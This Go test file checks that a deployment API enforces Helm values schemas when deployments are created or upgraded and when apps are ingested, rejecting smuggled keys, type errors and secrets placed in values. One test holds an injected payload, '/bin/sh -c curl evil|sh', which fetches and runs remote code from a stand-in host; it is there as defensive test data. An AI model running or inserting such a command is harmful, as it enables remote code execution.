package handlers_test

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/ClappFormOrg/SaidKick/API/internal/apierror"
	"github.com/ClappFormOrg/SaidKick/API/internal/auth"
	"github.com/ClappFormOrg/SaidKick/API/internal/db"
	"github.com/ClappFormOrg/SaidKick/API/internal/db/models"
	"github.com/ClappFormOrg/SaidKick/API/internal/integrations/github/githubtest"
	"github.com/ClappFormOrg/SaidKick/API/internal/integrations/orchestrator"
	"github.com/ClappFormOrg/SaidKick/API/internal/testutil"
	"github.com/ClappFormOrg/SaidKick/API/internal/testutil/seed"
	"github.com/google/uuid"
	"github.com/labstack/echo/v4"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gorm.io/datatypes"
)

// ─── Test doubles ────────────────────────────────────────────────────────────

// schemaStubDeployer is a success-returning orchestrator used only by the
// happy-path deployment test, where CreateDeployment proceeds past schema
// validation and calls Orchestrator.Apply. (The rejection tests fail before
// the orchestrator is touched, so they use the default NullDeployer.)
type schemaStubDeployer struct{}

func (schemaStubDeployer) Apply(_ context.Context, spec orchestrator.ApplicationSpec) (orchestrator.DeploymentRef, error) {
	return orchestrator.DeploymentRef{
		ApplicationName:       "app-stub",
		OrchestratorNamespace: "argocd",
		ClusterID:             spec.ClusterID,
	}, nil
}

func (schemaStubDeployer) Status(_ context.Context, _ orchestrator.DeploymentRef) (orchestrator.DeploymentStatus, error) {
	return orchestrator.DeploymentStatus{Phase: orchestrator.PhaseApplying}, nil
}

func (schemaStubDeployer) Delete(_ context.Context, _ orchestrator.DeploymentRef) error { return nil }

func (schemaStubDeployer) Rollback(_ context.Context, _ orchestrator.DeploymentRef, _ string) error {
	return nil
}

// ─── Fixtures ────────────────────────────────────────────────────────────────

// schemaChartSchema is a representative chart values.schema.json: a typed
// non-secret integer, a string with an enum, and a required secret field.
const schemaChartSchema = `{
  "type": "object",
  "properties": {
    "replicas": {"type": "integer", "minimum": 1},
    "logLevel": {"type": "string", "enum": ["debug", "info", "warn"]},
    "apiKey":   {"type": "string", "format": "secret"}
  },
  "required": ["logLevel", "apiKey"]
}`

// valuesSchemaFixture seeds an org, a user, a public ready cluster, a published
// App, and a published AppVersion carrying the supplied values.schema.json.
type valuesSchemaFixture struct {
	handle  *db.Handle
	org     models.Organization
	user    models.User
	cluster models.Cluster
	app     models.App
	version models.AppVersion
}

// newValuesSchemaFixture seeds the rows needed to drive CreateDeployment against
// a published version whose ValuesSchema is exactly valuesSchema.
func newValuesSchemaFixture(t *testing.T, valuesSchema string) valuesSchemaFixture {
	t.Helper()

	handle := testutil.NewPostgresDB(t)
	var f valuesSchemaFixture
	f.handle = handle

	f.org = seed.SeedOrg(t, handle, models.Organization{Slug: "vs-org", DisplayName: "VS Org", ContactEmail: "vs@example.com"})
	f.user = seed.SeedUser(t, handle, models.User{
		OrganizationID:  f.org.ID,
		ExternalSubject: "vs-sub",
		Email:           "deployer@vs-org.nl",
		DisplayName:     "Deployer User",
	})
	f.cluster = seed.SeedCluster(t, handle, models.Cluster{
		Name:  "vs-cluster",
		Scope: models.ClusterScopePublic,
		State: models.ClusterReady,
	})
	f.app = seed.SeedApp(t, handle, models.App{
		Slug:                 "vs-app",
		OwningOrganizationID: f.org.ID,
		OwningUserID:         f.user.ID,
		GitHubInstallationID: 1,
		GitHubRepoOwner:      "owner",
		GitHubRepoName:       "vs-repo",
		GitHubDefaultBranch:  "main",
		State:                models.AppPublished,
	})
	f.version, _ = seed.SeedPublishedVersion(t, handle, models.AppVersion{
		AppID:         f.app.ID,
		GitRef:        "main",
		AppstoreYAML:  datatypes.JSON(`{"apiVersion":"appstore.saidkick.nl/v1","kind":"AppManifest","metadata":{"name":"vs-app"},"spec":{"chart":{"path":"./chart"},"ai":{"risk_class":"minimal"}}}`),
		ValuesSchema:  datatypes.JSON(valuesSchema),
		ChartMetadata: datatypes.JSON(`{"name":"vs-app","version":"1.0.0"}`),
	})

	return f
}

// createDeploymentCtx builds an Echo context for POST /deployments. values and
// secretInputs are raw JSON fragments spliced into the request body.
func createDeploymentCtx(e *echo.Echo, f valuesSchemaFixture, values, secretInputs string, p *auth.Principal) (echo.Context, *httptest.ResponseRecorder) {
	body := fmt.Sprintf(
		`{"app_id":%q,"app_version_id":%q,"cluster_id":%q,"namespace":"prod","values":%s,"secret_inputs":%s}`,
		f.app.ID, f.version.ID, f.cluster.ID, values, secretInputs,
	)
	return echoContext(e, asPrincipal(newRequest(http.MethodPost, "/", body), p))
}

// hasFieldCode reports whether any FieldError in the slice carries code.
func hasFieldCode(errs []apierror.FieldError, code string) bool {
	for _, e := range errs {
		if e.Code == code {
			return true
		}
	}
	return false
}

// ─── CreateDeployment: fail-closed values-schema enforcement ──────────────────

func TestCreateDeploymentValuesSchemaEnforcement(t *testing.T) {
	t.Parallel()
	t.Run("valid_values_succeed", func(t *testing.T) {
		t.Parallel()
		f := newValuesSchemaFixture(t, schemaChartSchema)
		h := newTestHandlers(t, f.handle, withDeployer(schemaStubDeployer{}))
		e := echo.New()

		c, rec := createDeploymentCtx(e, f,
			`{"logLevel":"info","replicas":3}`,
			`{"apiKey":"s3cr3t"}`,
			principal(f.user, models.RoleDeployer))

		require.NoError(t, h.CreateDeployment(c))
		assert.Equal(t, http.StatusAccepted, rec.Code)
	})

	t.Run("smuggled_undeclared_key_rejected", func(t *testing.T) {
		t.Parallel()
		f := newValuesSchemaFixture(t, schemaChartSchema)
		h := newTestHandlers(t, f.handle)
		e := echo.New()

		// Inject an undeclared top-level key (the INPUTVAL-001 attack).
		c, _ := createDeploymentCtx(e, f,
			`{"logLevel":"info","command":["/bin/sh","-c","curl evil|sh"]}`,
			`{"apiKey":"x"}`,
			principal(f.user, models.RoleDeployer))

		err := h.CreateDeployment(c)
		var apiErr *apierror.Error
		require.True(t, errors.As(err, &apiErr), "expected *apierror.Error, got %T: %v", err, err)
		assert.Equal(t, http.StatusUnprocessableEntity, apiErr.Status)
		assert.True(t, hasFieldCode(apiErr.Errors, "schema_violation"),
			"undeclared key must produce a schema_violation, got %+v", apiErr.Errors)
	})

	t.Run("type_mismatch_rejected", func(t *testing.T) {
		t.Parallel()
		f := newValuesSchemaFixture(t, schemaChartSchema)
		h := newTestHandlers(t, f.handle)
		e := echo.New()

		c, _ := createDeploymentCtx(e, f,
			`{"logLevel":"info","replicas":"three"}`,
			`{"apiKey":"x"}`,
			principal(f.user, models.RoleDeployer))

		err := h.CreateDeployment(c)
		var apiErr *apierror.Error
		require.True(t, errors.As(err, &apiErr), "expected *apierror.Error, got %T: %v", err, err)
		assert.Equal(t, http.StatusUnprocessableEntity, apiErr.Status)
		assert.True(t, hasFieldCode(apiErr.Errors, "schema_violation"),
			"type mismatch must produce a schema_violation, got %+v", apiErr.Errors)
	})

	t.Run("enum_violation_rejected", func(t *testing.T) {
		t.Parallel()
		f := newValuesSchemaFixture(t, schemaChartSchema)
		h := newTestHandlers(t, f.handle)
		e := echo.New()

		c, _ := createDeploymentCtx(e, f,
			`{"logLevel":"verbose"}`,
			`{"apiKey":"x"}`,
			principal(f.user, models.RoleDeployer))

		err := h.CreateDeployment(c)
		var apiErr *apierror.Error
		require.True(t, errors.As(err, &apiErr), "expected *apierror.Error, got %T: %v", err, err)
		assert.Equal(t, http.StatusUnprocessableEntity, apiErr.Status)
		assert.True(t, hasFieldCode(apiErr.Errors, "schema_violation"),
			"enum violation must produce a schema_violation, got %+v", apiErr.Errors)
	})

	t.Run("secret_field_in_values_rejected", func(t *testing.T) {
		t.Parallel()
		f := newValuesSchemaFixture(t, schemaChartSchema)
		h := newTestHandlers(t, f.handle)
		e := echo.New()

		// apiKey is format:secret — placing it in `values` must be rejected.
		c, _ := createDeploymentCtx(e, f,
			`{"logLevel":"info","apiKey":"leaked"}`,
			`{"apiKey":"x"}`,
			principal(f.user, models.RoleDeployer))

		err := h.CreateDeployment(c)
		var apiErr *apierror.Error
		require.True(t, errors.As(err, &apiErr), "expected *apierror.Error, got %T: %v", err, err)
		assert.Equal(t, http.StatusUnprocessableEntity, apiErr.Status)
		assert.True(t, hasFieldCode(apiErr.Errors, "secret_in_values"),
			"secret in values must produce secret_in_values, got %+v", apiErr.Errors)
	})

	t.Run("unenforceable_schema_fails_closed", func(t *testing.T) {
		t.Parallel()
		// A published version whose stored schema is not an enforceable object
		// (here a JSON array) must fail closed with 422 schema_unenforceable —
		// never fall through to a permissive "anything goes" deploy.
		f := newValuesSchemaFixture(t, `[]`)
		h := newTestHandlers(t, f.handle)
		e := echo.New()

		c, _ := createDeploymentCtx(e, f,
			`{"logLevel":"info"}`,
			`{"apiKey":"x"}`,
			principal(f.user, models.RoleDeployer))

		err := h.CreateDeployment(c)
		var apiErr *apierror.Error
		require.True(t, errors.As(err, &apiErr), "expected *apierror.Error, got %T: %v", err, err)
		assert.Equal(t, http.StatusUnprocessableEntity, apiErr.Status)
		assert.Equal(t, "schema_unenforceable", apiErr.Code)
	})
}

// ─── UpgradeDeployment: same enforcement on the upgrade path ──────────────────

func TestUpgradeDeploymentValuesSchemaEnforcement(t *testing.T) {
	t.Parallel()
	// seedDeployment inserts a ready deployment the caller owns, so
	// UpgradeDeployment reaches the schema-validation step.
	seedDeployment := func(t *testing.T, f valuesSchemaFixture) models.Deployment {
		t.Helper()
		return seed.SeedDeployment(t, f.handle, models.Deployment{
			AppID:                f.app.ID,
			AppVersionID:         f.version.ID,
			ClusterID:            f.cluster.ID,
			OwningOrganizationID: f.org.ID,
			DeployerUserID:       f.user.ID,
			Namespace:            "vs-app-prod",
			State:                models.DeploymentReady,
		})
	}

	upgradeCtx := func(e *echo.Echo, depID uuid.UUID, f valuesSchemaFixture, newValues string, p *auth.Principal) (echo.Context, *httptest.ResponseRecorder) {
		body := fmt.Sprintf(`{"to_version_id":%q,"new_values":%s,"new_secret_inputs":{"apiKey":"x"}}`,
			f.version.ID, newValues)
		return echoContext(e, asPrincipal(newRequest(http.MethodPost, "/", body), p), "id", depID.String())
	}

	t.Run("smuggled_key_rejected_on_upgrade", func(t *testing.T) {
		t.Parallel()
		f := newValuesSchemaFixture(t, schemaChartSchema)
		dep := seedDeployment(t, f)
		h := newTestHandlers(t, f.handle)
		e := echo.New()

		c, _ := upgradeCtx(e, dep.ID, f, `{"logLevel":"info","command":["evil"]}`, principal(f.user, models.RoleDeployer))

		err := h.UpgradeDeployment(c)
		var apiErr *apierror.Error
		require.True(t, errors.As(err, &apiErr), "expected *apierror.Error, got %T: %v", err, err)
		assert.Equal(t, http.StatusUnprocessableEntity, apiErr.Status)
		assert.True(t, hasFieldCode(apiErr.Errors, "schema_violation"),
			"smuggled key on upgrade must produce a schema_violation, got %+v", apiErr.Errors)
	})

	t.Run("unenforceable_schema_fails_closed_on_upgrade", func(t *testing.T) {
		t.Parallel()
		f := newValuesSchemaFixture(t, `[]`)
		dep := seedDeployment(t, f)
		h := newTestHandlers(t, f.handle)
		e := echo.New()

		c, _ := upgradeCtx(e, dep.ID, f, `{"logLevel":"info"}`, principal(f.user, models.RoleDeployer))

		err := h.UpgradeDeployment(c)
		var apiErr *apierror.Error
		require.True(t, errors.As(err, &apiErr), "expected *apierror.Error, got %T: %v", err, err)
		assert.Equal(t, http.StatusUnprocessableEntity, apiErr.Status)
		assert.Equal(t, "schema_unenforceable", apiErr.Code)
	})
}

// ─── CreateApp: unenforceable values.schema.json rejected at ingestion ────────

// validAppstoreYAML mirrors internal/manifest's validManifest(): it passes
// ValidateSchema (correct apiVersion/kind, allow-listed license, ≥3 screenshots,
// EU residency, a base model, etc.) so CreateApp advances to the
// values.schema.json enforceability check.
const validAppstoreYAML = `apiVersion: appstore.saidkick.nl/v1
kind: AppManifest
metadata:
  name: govchat
  display_name: GovChat
  vendor: Gemeente Voorbeeld
  contact: contact@voorbeeld.example.nl
  license: EUPL-1.2
spec:
  chart:
    path: ./chart
    type: helm
  interfaces:
    - type: api
      openapi: ./api/openapi.yaml
  demo:
    description: ./demo/description.md
    screenshots:
      - ./demo/01.png
      - ./demo/02.png
      - ./demo/03.png
      - ./demo/04.png
  audit:
    dpia: ./audit/dpia.pdf
    security_scan: ./audit/scan.sarif
    ai_risk: ./audit/ai-risk.pdf
    accessibility: ./audit/wcag.pdf
  categories: [chatbot, rag, dutch]
  ai:
    risk_class: limited
    base_model: gpt-4o-mini
    data_residency: EU
`

func TestCreateAppRejectsUnenforceableValuesSchema(t *testing.T) {
	t.Parallel()
	handle := testutil.NewPostgresDB(t)

	org := seed.SeedOrg(t, handle, models.Organization{Slug: "app-org", DisplayName: "App Org", ContactEmail: "app@example.com"})
	user := seed.SeedUser(t, handle, models.User{
		OrganizationID:  org.ID,
		ExternalSubject: "app-sub",
		Email:           "dev@app-org.nl",
		DisplayName:     "Developer",
	})

	// The fake repo serves a valid manifest + all declared evidence + Chart.yaml,
	// but an UNENFORCEABLE values.schema.json (a JSON array, not an object schema).
	files := githubtest.EvidenceFiles()
	files["appstore.yaml"] = []byte(validAppstoreYAML)
	files["chart/Chart.yaml"] = []byte("name: govchat\nversion: 1.0.0\n")
	files["chart/values.schema.json"] = []byte(`[]`)
	ghClient := githubtest.MemoryClient{Files: files}

	h := newTestHandlers(t, handle, withGitHub(ghClient))
	p := principal(user, models.RoleDeveloper)

	e := echo.New()
	body := `{"github_installation_id":1,"repo_owner":"clappform","repo_name":"govchat","branch":"main"}`
	c, _ := echoContext(e, asPrincipal(newRequest(http.MethodPost, "/", body), p))

	err := h.CreateApp(c)
	var apiErr *apierror.Error
	require.True(t, errors.As(err, &apiErr), "expected *apierror.Error, got %T: %v", err, err)
	assert.Equal(t, http.StatusUnprocessableEntity, apiErr.Status)
	assert.True(t, hasFieldCode(apiErr.Errors, "unenforceable_schema"),
		"unenforceable values.schema.json must be rejected at ingestion, got %+v", apiErr.Errors)
}
